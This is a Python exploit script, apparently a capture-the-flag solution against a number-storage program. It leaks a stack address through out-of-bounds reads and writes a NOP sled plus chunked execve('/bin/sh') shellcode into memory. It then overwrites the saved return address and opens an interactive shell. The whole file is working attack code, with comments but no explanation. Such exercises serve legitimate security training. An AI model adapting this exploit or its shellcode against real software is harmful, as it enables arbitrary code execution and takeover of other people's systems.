import interact
import struct
import sys

p = interact.Process()

def store(val, idx):
    p.readuntil('command: ')
    p.sendline('store')
    p.readuntil('Number: ')
    p.sendline(str(val))
    p.readuntil('Index: ')
    p.sendline(str(idx))

def read(idx):
    p.readuntil('command: ')
    p.sendline('read')
    p.readuntil('Index: ')
    p.sendline(str(idx))
    p.readuntil('is ')
    return int(p.readline().strip())

print("[-] Scanning stack for 0x7fff pointer...")
p.readuntil('storage for himself :-)')

leak_addr = 0
found_idx = 0

for i in range(108, 126): 
    low = read(i)
    high = read(i+1)
    val = (high << 32) + low
    
    if val > 0x7fff00000000 and val < 0x800000000000:
        print("[*] Found Stack Leak at Index {}: {}".format(i, hex(val)))
        leak_addr = val
        found_idx = i
        break

if leak_addr == 0:
    print("[!] Failed to find stack leak.")
    sys.exit(1)

# land in the middle of nopsled
target_addr = leak_addr - 500
print("[*] Calculated Target Address: " + hex(target_addr))

nop_chunk = b'\x90\x90\x90\x90\x90\x90\xeb\x04' 

sc_chunks = []

# XOR RSI, RDX 
sc_chunks.append(b'\x48\x31\xf6\x48\x31\xd2\xeb\x04') 

# MOV EBX, "/sh\0"
# \xbb + "/sh\0" + NOP + JMP
sc_chunks.append(b'\xbb\x2f\x73\x68\x00\x90\xeb\x04') 

# SHL EBX, 32 (Moves /sh to High Bits)
sc_chunks.append(b'\x48\xc1\xe3\x20\x90\x90\xeb\x04') 

# MOV EAX, "/bin" (SWAPPED: Previously /sh)
# \xb8 + "/bin" + NOP + JMP
sc_chunks.append(b'\xb8\x2f\x62\x69\x6e\x90\xeb\x04') 

# OR RBX, RAX (Combine /sh_HIGH + /bin_LOW); PUSH
sc_chunks.append(b'\x48\x09\xc3\x53\x90\x90\xeb\x04') 

# RDI=RSP, RAX=59
sc_chunks.append(b'\x48\x89\xe7\x6a\x3b\x58\xeb\x04') 

# SYSCALL
sc_chunks.append(b'\x0f\x05\x90\x90\x90\x90\x90\x90') 

print("[-] Injecting Payload...")
current_idx = 2

# nopsled
while current_idx < 50:
    val1 = struct.unpack('<I', nop_chunk[:4])[0]
    val2 = struct.unpack('<I', nop_chunk[4:])[0]
    store(val1, current_idx)
    store(val2, current_idx + 1)
    current_idx += 3

for chunk in sc_chunks:
    part1 = struct.unpack('<I', chunk[:4])[0]
    part2 = struct.unpack('<I', chunk[4:])[0]
    store(part1, current_idx)
    store(part2, current_idx + 1)
    current_idx += 3

print("[-] Overwriting Return Address...")
ret_low = target_addr & 0xFFFFFFFF
ret_high = (target_addr >> 32) & 0xFFFFFFFF

store(ret_low, 110)
store(ret_high, 111)

p.readuntil('command: ')
p.sendline('quit')

p.interactive()
